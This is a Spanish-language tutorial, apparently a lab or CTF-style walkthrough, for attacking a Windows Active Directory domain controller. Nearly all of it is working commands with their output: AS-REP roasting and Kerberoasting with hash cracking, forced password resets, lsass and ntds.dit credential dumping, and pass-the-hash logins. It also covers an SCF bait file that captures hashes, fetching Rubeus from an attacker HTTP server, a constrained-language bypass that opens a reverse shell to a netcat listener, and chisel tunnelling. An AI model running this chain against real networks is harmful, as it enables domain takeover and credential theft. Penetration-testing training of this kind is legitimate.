---
title: "Introducción a la enumeración y explotación de Active Directory"
date: Sat Aug 03 2024 02:00:00 GMT+0200 (Central European Summer Time)
categories: [Tutoriales, Active Directory]
tags: [windows, active-directory, crackmapexec, cme, smbmap, kerberos, smb, winrm, kerbrute, impacket, rpcclient, ldapdomaindum, bloodhound, asreproast, evilwinrm, samdump2, diskshadow, rubeus, sharphound, chisel, oscp]
image: /assets/img/cabeceras/active-directory-logo.png
---

## ESCENARIO DE PRUEBAS: AD EN WINDOWS SERVER X64 CON KERBEROS Y SMB ACTIVOS

#### INTRODUCCIÓN:

Aquí se describe una prueba de concepto en un servidor **Windows Server que es controlador de dominio y catálogo global**. Los puertos y servicios expuestos son los siguientes:

	53   TCP  DNS
	88   TCP  Kerberos
	135  TCP  RPC
	139  TCP  NetBios
	445  TCP  SMB
	593  TCP  RPC sobre HTTP
	5985 TCP  WinRM

#### ENUMERACIÓN BÁSICA SMB:

- Enumeramos el servicio SMB para obtener información del SO, nombres de dominio y recursos compartidos:


```shell
$ cme smb 10.10.10.50
...

$ crackmapexec smb 10.10.10.50
```

- Intentamos autenticarnos con una sesión nula para ver los recursos compartidos:

```shell
$ smbmap -H 10.10.10.50 -u 'null'
...

C$                     NO ACCESS
COMPARTIDO             READ ONLY
...
```

- Si nos muestra algún recurso con permisos de lectura, como en este caso el recurso `COMPARTIDO`, podemos intentar visualizar el contenido:

```shell
$ smbmap -H 10.10.10.50 -u 'null' -r 'COMPARTIDO'
```

- En el caso que encontráramos carpetas relevantes como nombres de usuario, lo más recomendable es hacernos un diccionario con dichos nombres para posteriormente utilizarlos en ataques de fuerza bruta.


#### KERBEROS (ASREP ROAST):

- Si tenemos un diccionario con posibles usuarios podemos intentar de validarlos en el domino a través del protocolo *kerberos* con la herramienta *kerbrute*:

```shell
$ kerbrute -dc-ip 10.10.10.50 -domain contoso.local -users usuarios.txt

[*] Valid user => lisa
[*] Valid user => john [NOT PREAUTH]
[*] No passwords were discovered :'(
```

- Si tenemos la suerte de encontrar algún usuario como el anterior (`john`) que no necesita de autenticación previa de kerberos, podemos hacernos pasar por ese usuario contra la validación del DC.

- Con este comando podemos generarnos un TGT (Ticket Granting Ticket) para el usuario `john`:

```shell
$ impacket-GetNPUsers contoso.local/john -no-pass

[*] Getting TGT for john
...

$krb5asrep$23$john@contoso.local:j34598erwjher9t459tertgh9564754h$9rtey456yh945y9456dssdsdddk4458dff8f...
```

- Una vez tenemos el TGT lo guardamos en una archivo llamado "hash" y podemos intentar crackearlo con `john the ripper`:

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...

mypassword123 (krb5asrep$23$john@CONTOSO.LOCAL)
...
```


#### VALIDANDO CREDENCIALES POR SMB:

- Una vez conseguido el password vamos a intentar validarnos con las credenciales obtenidas:

```shell
$ crackmapexec smb 10.10.10.50 -u 'john' -p 'mypassword123'
...

SMB    10.10.10.50    445    DC01    [+] CONTOSO.local\john:mypassword123
...
```

- Nos da un [+], esto significa que las credenciales son válidas pero no tenemos permisos de administrador o la capacidad de administración remota con WinRM, en ese caso saldría un `Pwned!`.


#### OBTENIENDO LA INFORMACIÓN DEL DOMINIO:

- Ahora que tenemos credenciales válidas, vamos a seguir enumerando el dominio.

```shell
$ rpcclient -U 'john%mypassword123' 10.10.10.50
...

$ rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[john] rid:[0x1f5]
user:[lisa] rid:[0x44f]
...
```

- Otra herramienta que podemos usar es `ldapdomaindump` pero como genera un archivo .html conviene levantar el servicio apache antes para poder visualizarlo.

```shell
$ service apache2 start
...

$ cd /var/www/html
...

$ ldapdomaindump -u 'contoso.local\john' -p 'mypassword123' 10.10.10.50
...
[*] Connecting to host...
...
```


#### ENUMERANDO CON BLOODHOUND:

- Como no tenemos acceso físico a la máquina para lanzar `SharpHound`, utilizaremos esta herramienta que nos permitirá enumerar la información necesaria de forma remota.

```shell
$ bloodhound-python -c all -u 'john' -p 'mypassword123' -ns 10.10.10.50 -d contoso.local
...
```

- Este script nos podrá generar un archivo que podremos importar como DB a `BloodHound` (opcional).

- BloodHound nos muestra que el usuario `john@contoso.local` tiene un permiso "ForceChangePassword" con el que podemos cambiar la contraseña de otro usuario llamado `audit2020@contoso.local`. 

- Vamos a intentar cambiar la contraseña de ese usuario para validarnos con él y ver si dispone de nuevos permisos para seguir avanzando en la intrusión.

```shell
$ rpcclient -U 'john%mypassword123' 10.10.10.50
...

$ rpcclient $> setuserinfo2 audit2020 23 'Contraseña123'
```

#### OTRAS OPCIONES:
```
rpcclient //10.10.10.50 -U "nombre_de_usuario%contraseña" -c 'setuserinfo2 audit2020 23 "Contraseña123"'
...
rpcclient -c 'setuserinfo2 audit2020 23 "Contraseña123"' 10.10.10.50
```
El número `23` en el comando `setuserinfo2` de `rpcclient` se refiere al nivel de información del usuario que deseas establecer [+info](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration) y [+info2](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration)

En este caso, el nivel `23` se utiliza para cambiar la contraseña de un usuario [+info](https://medium.com/@jackleed/hack-the-box-writeup-4-blackfield-832bb9b5cef4)


- Otra manera:

```shell
$ net rpc password 'audit2020' -U 'john' -S 10.10.10.50
...

Enter new password fir audit2020:
Password for [WORKGROUP\john]:
...
```

- Validamos con CrackMapExec:
```
...
[+] CONTOSO.local\audit2020:Contraseña123
...
```

- Seguimos enumerando por SMB con los nuevos credenciales conseguidos:

```bash
$ smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123'
...
```

- Descubrimos nuevos accesos de solo lectura a nuevos recursos compartidos, los enumeramos uno a uno.

```bash
smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' -r documentos
...

smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' -r forense
...

etc...
```

---

- NOTA: Si no queremos ir abriendo carpeta por carpeta lo mejor es hace un punto de anclaje del recurso compartido hacia nuestro equipo, también lo llaman "montura":

```bash
$ mount -t cifs "//10.10.10.50/CarpetaCompartida" /mnt/
...

$ ls -l /mnt
...

$ cd mnt
$ tree
...
```

- Para buscar archivos de lectura que tengamos para cualquier usuario:

```bash
$ cd /mnt 
$ find . | sed 's/.\///' | while read line; do echo -e "\n--- $line ---"; smbcacls '\\10.10.10.50\CarpetaCompartida' $line -N | grep Everyone | grep -i FULL; done  
```

---

- En una carpeta encontramos copias de seguridad de algunos archivos del sistema, entre ellos encontramos un archivo comprimido sospechoso llamado `lsass.zip`...


- Nos lo descargamos a nuestra máquina para poder analizarlo:

```bash
$ smbmap -H 10.10.10.50 -u 'audit2020' -p 'Contraseña123' --download forensic/memory_analysis/lsass.zip
```

- Cuando descomprimimos el archivo hay un archivo llamado `lsass.DMP`, vamos a ver qué tiene con `pypykatz`:

```bash
$ pypykatz lsa minidump lsass.DMP
...
```

- Una vez obtenidos los usuarios y hashes de las contraseñas podemos usarlos para poder autenticarnos usando "pass the hash" con `evil-winrm`:

```bash
$ evil-winrm -i 10.10.10.50 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
...

WINRM (pwn3d!)
...

PS C:\Users\svc_backup> whoami /priv
...
PRIVILEGES INFORMATION
----------------------
...
```

- Maravilloso, obtenemos las credenciales de un usuario con permisos administrativos y entramos en el equipo a través de WinRM


#### EXTRAYENDO USUARIOS LOCALES:

- Vamos a seguir extrayendo información con `Evil-WinRM`:

```shell
Evil-WinRM PS C:\Users\svc_backup\Desktop> reg save HKLM\system system
The operation completed successfully.
...
Evil-WinRM PS C:\Users\svc_backup\Desktop> reg save HKLM\sam sam
The operation completed successfully.
...
Evil-WinRM PS C:\Users\svc_backup\Desktop> download system
Info: Downloading system to ./system
Info: Download successful!
...
Evil-WinRM PS C:\Users\svc_backup\Desktop> download sam
Info: Downloading system to ./sam
Info: Download successful!
...
```

- Si conseguimos descargarnos del registro las claves de sam y system podemos descifrarlas con `samdump2`:

```shell
$ samdump2 system sam
```


#### DISKSHADOW:

1. `Diskshadow` es una herramienta que está nativa dentro de Windows Server. Con él podremos dumpear el contenido del archivo `ntds.dit` montándolo en una unidad nueva para poder acceder a él:

2. Primero creamos el archivo que usaremos para `diskshadow`, para ello crearemos el archivo "diskshadow.txt" con el siguiente contenido:

```shell
set context persistent nowriters
add volume c: alias caracola
create
expose %caracola% h:
exec "cmd.exe" /c robocopy /b h:\windows\ntds\ c:\users\svc_backup\music\ ntds.dit
delete shadows volume %caracola%
reset
```

NOTA: Si nos os funciona probad añadiendo un espacio al final de cada línea.

- Ahora lo ejecutamos con *disk*

```bash
$ diskshadow /s .\dirkshadow.txt
```

- Qué hacemos ahora? pues crackearlo con *impacket-secretsdump*:

```bash
$ impacket-secretsdump -system -ntds ntds.dit LOCAL
...
```

- Tenemos las cuentas de "Administrator" y "krbtgt", que nos servirá para realizar los ataques de Silver/Golden Ticket pero como tenemos el usuario Administrador en este caso pues no hace falta usar otro usuario.

- Comprobamos las credenciales de administrador con un "pass to hash":

```bash
$ crackmapexec smb 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
...
(Pwn3d!)
...
$ evil-winrm -i 10.10.10.50 -u 'Administrator' -H '9658d1d1dcd9250115e2205d9f48400d'
...
Evil WinRM Shell v.3.4
...
```


#### PONER CEBO DE PARA AUTENTICACIÓN SMB:

- En una de las carpetas compartidas donde tengamos permisos de escritura, crearemos un archivo con extensión .scf (por ejemplo miraesto.scf) con el siguiente contenido:

```bash
[shell]
Command=2
IconFile=\\10.10.14.14\smbFolder\image.jpg
```

- Por otro lado crearemos el recurso compartido con SAMBA en nuestra máquina visible desde la máquina víctima, verá una app con el icono con el .jpg que hayamos definido:

```bash
$ impacket-smbserver smbFolder $(pwd) -smb2support
...
```

- En el momento que la víctima entre en alguna de sus carpetas, vea el icono y lo intente ejecutar, hará un intento de validación con sus credenciales en nuestro recurso compartido, capturando su hash de inicio de sesión:

- Cogemos ese hash y el usuario y lo crackeamos con `john`:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
miSuperPassword123     (amanda)
```

- A partir de aquí, se pueden probar todas las formas de validación contra el servidor que queramos.


-----

## ANEXO:

#### EXTRAER LOS TGS:

- Con las credenciales obtenidas del usuario "amanda" podemos lanzar contra un recurso en específico.

```shell
$ impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 
```

- Los resultados obtenidos son pobres ya que no tenemos el puerto 88 de kerberos expuesto pero en el informe vemos que el usuario "amanda" pertenece a un grupo llamado "Remote Management Users" ¿Qué podemos hacer con esto? Pues autenticarnos en el sistema por `WinRM`. 

- IMPORTANTE: Antes de poder entrar deberemos conseguir un clave pública .cer y otro .key correspondiente a la clave privada y en el video no explica cómo. Cuando sepa cómo hacerlo actualizaré. [Más info](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials)

- Nos autenticamos por WinRM contra el servidor:

```shell
$ evil-winrm -S -c certnew.cer -K priv.key -i 10.10.10.50 -u 'amanda' -p 'miSuperPassword123'
...
```

- El objetivo ahora es subir binarios (archivos ejecutables) al sistema.  Muy importante saber la arquitectura del sistema (32 ó 64 bits) para ejecutar el binario apropiado. Para ello levantaremos un servidor http en nuestro equipo y haremos la demanda de archivos desde el equipo víctima. Intentando evadir las protecciones antivirus y demás restricciones que nos pueden impedir que lo llevemos acabo. 

```shell
$ sudo python3 -m http.server 8080
```

- En este caso descargaremos una versión de `Rubeus` ya [compilada](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe) y lo llevaremos a nuestra máquina víctima.

```shell
> iwr -uri http://10.10.14.200:8080/Rubeus.exe -Outfile .\Rubeus.exe
....
> .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
```

- `Rubeus` lo que nos va a permitir es generar el TGS (Ticket Granting Server) Para su posterior crackeo. Más info https://www.techopedia.com/definition/27186/ticket-granting-server-tgs

- También vamos a ejecutar `SharpHound` [descarga](https://github.com/BloodHoundAD/SharpHound) que nos permitirá volver a volcar toda la información del dominio para poder analizarla de nuevo. Para ello copiaremos el binario dentro de la máquina víctima mediante el procedimiento descrito en el punto número 7.

```shell
> Import-module .\SharpHound.ps1 
....
Importing *.ps1 files as modules is not allowed in ConstrainedLanguage Mode.
```

- Veremos que al intentar importar el script no nos deja porque el usuario tiene un política aplicada que no permite la ejecución de scripts. ¿Cómo burlamos esta restricción? Con `PsByPassCLM`.

- En nuestro equipo nos pondremos en espera para recibir una consola:

```shell
$ rlwrap nc -nlvp 443
```
- Descargamos el binario y lo pasamos a la máquina víctima y lo ejecutamos. Más info de *PsByPassCLM* [aquí](https://github.com/padovah4ck/PSByPassCLM)

- [Descarga binario compilado](https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe)

```shell
> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.4 /rport=443 /U C:\Windows\Temp\CLM\PsBypassCLM.exe
```

- De esta manera nos enviará una consola "FullLanguage" que significa que ya no tendremos restricciones en ejecución de escripts.

---

#### PORT FORWARDING CON CHISEL:

- Con `Rubeus` podemos generar el TGS para posteriormente crackearlo como hemos hecho un poco más arriba...

```shell
> .\Rubeus.exe kerberoast /creduser:contoso.local\amanda /credpassword:miSuperPassword123
....
```

- ... O hacer port forwarding con `chisel` para poder atacar directamente al puerto 88 (kerberos). Para ello mapearemos los puertos internos de la máquina víctima hacia nuestra máquina para poder atacarlos de una manera más cómoda. Copiamos el archivo "chisel.exe" a nuestra máquina víctima. [Descarga](https://github.com/jpillora/chisel/releases/tag/v1.8.1)

- Del lado de nustro equipo iniciaremos `chisel` en modo servidor:

```shell
$ chisel server --reverse -p 1234
```

- Del lado la máquina víctima iniciaremos "chisel.exe" para mapear los puertos 88 y 389 TCP:

```shell
> chisel.exe client 10.10.14.44:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
```

- De esta manera todo lo que escaneemos en nuestra máquina en localhost:88 y localhost:389 en realidad estaremos escaneando los puertos de la máquina víctima. Para comprobar los puertos que tenemos ocupados los podremos hacer con el comando de Linux *lsof*:

```bash
$ lsof -i:88
...
$ lsof -i:389
```

- Vamos a proceder a extraer el TGS ahora que tenemos expuestos los puertos en nuestra máquina:

```shell
$ impacket-GetUserSPNs contoso.local/amanda:miSuperPassword123 -request -dc-ip 127.0.0.1 
```

- Copiamos el hash extraído y lo crackeamos con nuestro amigo `john`:

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
```


------

#### ATAQUES POR IPV6

- A veces no tenemos expuestos de primeras los puertos 88, 389 y 445 TCP en un escaneo normal en IPv4. Para ello usaremos la herramienta `IOXIDResolver.py` que aprovechando el puerto 135 TCP se puede extraer la IPv6. [Descarga](https://github.com/mubix/IOXIDResolver)

```shell
$ python3 IOXIDResolver.py -t 10.10.10.50
```

## ESCALADA DE PRIVILEGIOS

#### SeDebugPrivilege Deshabilitado
```
.\psgetsys.ps1  
.\EnableAllTokenPrivs.ps1

Esto habilita el privilegio pero...
Se necesita ejecutar un meterpreter para migrar al PID de System. 
```


-----

##### NOTA INFORMATIVA:  Este tutorial ha sido desarrollado a partir de una ponencia del gran David Ojeda [@daviddojedaa](https://x.com/daviddojedaa)
Gracias por tu gran sabiduría.

-----
